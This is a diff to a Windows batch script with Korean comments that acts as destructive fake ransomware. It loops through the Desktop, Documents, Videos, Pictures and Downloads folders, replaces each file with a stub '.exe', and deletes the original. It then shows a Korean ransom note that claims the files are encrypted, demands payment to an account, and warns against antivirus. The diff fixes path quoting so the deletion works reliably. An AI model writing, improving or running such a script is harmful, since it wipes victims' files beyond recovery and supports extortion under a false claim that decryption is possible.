@@ -23,8 +23,8 @@ cd "%userprofile%\Desktop"
 For /F "tokens=*" %%i in ('dir /b /s /a-h /a-d') do (
     :: desktop.ini와 자기 자신 제외
     if /I not "%%~nxi"=="desktop.ini" if /I not "%%~fi"=="%~f0" (
-        echo AES Crypto>"%%i.exe"
-        Del /f /q "%%i"
+        echo AES Crypto>"%%~i.exe"
+        Del /f /q "%%~i"
     )
 )
 
@@ -33,8 +33,8 @@ cd "%userprofile%\Documents"
 For /F "tokens=*" %%a in ('dir /b /s /a-h /a-d') do (
     :: desktop.ini와 자기 자신 제외
 	if /I not "%%~nxa"=="desktop.ini" if /I not "%%~fa"=="%~f0" (
-		echo AES Crypto>"%%a.exe"
-        	Del /f /q "%%a"
+		echo AES Crypto>"%%~a.exe"
+        	Del /f /q "%%~a"
     )
 )
 
@@ -43,8 +43,8 @@ cd "%userprofile%\Videos"
 For /F "tokens=*" %%l in ('dir /b /s /a-h /a-d') do (
     :: desktop.ini와 자기 자신 제외
     if /I not "%%~nxl"=="desktop.ini" if /I not "%%~fl"=="%~f0" (
-        echo AES Crypto>"%%l.exe"
-        Del /f /q "%%l"
+        echo AES Crypto>"%%~l.exe"
+        Del /f /q "%%~l"
     )
 )
 
@@ -53,8 +53,8 @@ cd "%userprofile%\Pictures"
 For /F "tokens=*" %%j in ('dir /b /s /a-h /a-d') do (
     :: desktop.ini와 자기 자신 제외
     if /I not "%%~nxj"=="desktop.ini" if /I not "%%~fj"=="%~f0" (
-        echo AES Crypto>"%%j.exe"
-        Del /f /q "%%j"
+        echo AES Crypto>"%%~j.exe"
+        Del /f /q "%%~j"
     )
 )
 
@@ -63,15 +63,15 @@ cd "%userprofile%\Downloads"
 For /F "tokens=*" %%k in ('dir /b /s /a-h /a-d') do (
     :: desktop.ini와 자기 자신 제외
 	if /I not "%%~nxk"=="desktop.ini" if /I not "%%~fk"=="%~f0" (	
-		echo AES Crypto>"%%k.exe"
-		Del /f /q "%%k"
+		echo AES Crypto>"%%~k.exe"
+		Del /f /q "%%~k"
 	)
 )
 
 :: 사용자에게 메시지 출력 및 해독키 입력 요구
 :1
 echo 당신의 중요한 파일이 암호화되었습니다
-echo 해독키를 얻으려면 곽에게 %random%이 돈을 넣어주십시오.
+echo 해독키를 얻으려면 (해당 계좌)에 %random%이 돈을 넣어주십시오.
 echo 백신 프로그램을 사용하지 마십시오.
 echo 파일의 확장자를 바꾸지 마십시오! 변경 시 복구가 불가능할 수 있습니다.
 echo 해독키를 입력하십시오:
